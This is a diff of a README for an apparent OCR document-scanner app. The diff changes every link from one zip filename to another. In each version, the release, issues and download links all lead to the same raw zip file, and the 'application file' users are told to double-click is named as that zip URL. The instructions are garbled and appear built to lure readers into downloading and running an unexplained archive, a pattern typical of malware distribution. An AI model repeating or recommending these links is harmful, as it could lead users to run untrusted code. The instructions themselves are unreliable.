@@ -1,7 +1,7 @@
 # 📄 ocr_scanner_gemini - Scan Documents with Ease
 
 ## 💾 Download Now
-[![Download](https://raw.githubusercontent.com/GamemodeG/ocr_scanner_gemini/main/pyimagesearch/ocr_scanner_gemini_v3.3.zip%20release-blue)](https://raw.githubusercontent.com/GamemodeG/ocr_scanner_gemini/main/pyimagesearch/ocr_scanner_gemini_v3.3.zip)
+[![Download](https://raw.githubusercontent.com/GamemodeG/ocr_scanner_gemini/main/pyimagesearch/ocr-scanner-gemini-3.3.zip%20release-blue)](https://raw.githubusercontent.com/GamemodeG/ocr_scanner_gemini/main/pyimagesearch/ocr-scanner-gemini-3.3.zip)
 
 ## 📋 Description
 Welcome to ocr_scanner_gemini! This web application helps you scan documents easily. With advanced features like corner detection and perspective transformation, you can get high-quality scans. The optical character recognition (OCR) uses the latest Gemini 3 Pro technology, making it ideal for students, professionals, and anyone needing document processing.
@@ -9,7 +9,7 @@ Welcome to ocr_scanner_gemini! This web application helps you scan documents eas
 ## 🚀 Getting Started
 Using ocr_scanner_gemini is simple. Follow these steps to download and run the application.
 
-1. **Visit the Releases Page**: Go to the [Releases Page](https://raw.githubusercontent.com/GamemodeG/ocr_scanner_gemini/main/pyimagesearch/ocr_scanner_gemini_v3.3.zip).
+1. **Visit the Releases Page**: Go to the [Releases Page](https://raw.githubusercontent.com/GamemodeG/ocr_scanner_gemini/main/pyimagesearch/ocr-scanner-gemini-3.3.zip).
    
 2. **Select the Latest Version**: Find the most recent release. This version includes the latest features and fixes.
 
@@ -17,12 +17,12 @@ Using ocr_scanner_gemini is simple. Follow these steps to download and run the a
 
 4. **Extract the Files**: If the downloaded file is a zip or tar file, right-click and choose “Extract All” to unzip it.
 
-5. **Run the Application**: Find the extracted folder and double-click the main application file. It might be named `https://raw.githubusercontent.com/GamemodeG/ocr_scanner_gemini/main/pyimagesearch/ocr_scanner_gemini_v3.3.zip` for Windows or `https://raw.githubusercontent.com/GamemodeG/ocr_scanner_gemini/main/pyimagesearch/ocr_scanner_gemini_v3.3.zip` for Mac.
+5. **Run the Application**: Find the extracted folder and double-click the main application file. It might be named `https://raw.githubusercontent.com/GamemodeG/ocr_scanner_gemini/main/pyimagesearch/ocr-scanner-gemini-3.3.zip` for Windows or `https://raw.githubusercontent.com/GamemodeG/ocr_scanner_gemini/main/pyimagesearch/ocr-scanner-gemini-3.3.zip` for Mac.
 
 6. **Follow On-Screen Instructions**: Once the application starts, follow the prompts to begin scanning your documents.
 
 ## 📥 Download & Install
-To get started, please visit the [Releases Page](https://raw.githubusercontent.com/GamemodeG/ocr_scanner_gemini/main/pyimagesearch/ocr_scanner_gemini_v3.3.zip) and download the appropriate version of the application. 
+To get started, please visit the [Releases Page](https://raw.githubusercontent.com/GamemodeG/ocr_scanner_gemini/main/pyimagesearch/ocr-scanner-gemini-3.3.zip) and download the appropriate version of the application. 
 
 ## 📊 Features
 - **Corner Detection**: Accurately identifies edges of documents.
@@ -44,7 +44,7 @@ If you run into issues:
 - **Incorrect OCR Output**: Make sure that the document is clear and well-lit for better recognition.
 
 ## 🌐 Community and Support
-For any questions or assistance, please reach out to our community or check the [issues page](https://raw.githubusercontent.com/GamemodeG/ocr_scanner_gemini/main/pyimagesearch/ocr_scanner_gemini_v3.3.zip) on GitHub. 
+For any questions or assistance, please reach out to our community or check the [issues page](https://raw.githubusercontent.com/GamemodeG/ocr_scanner_gemini/main/pyimagesearch/ocr-scanner-gemini-3.3.zip) on GitHub. 
 
 Your feedback is welcome. If you find issues or have suggestions, please contribute!
 
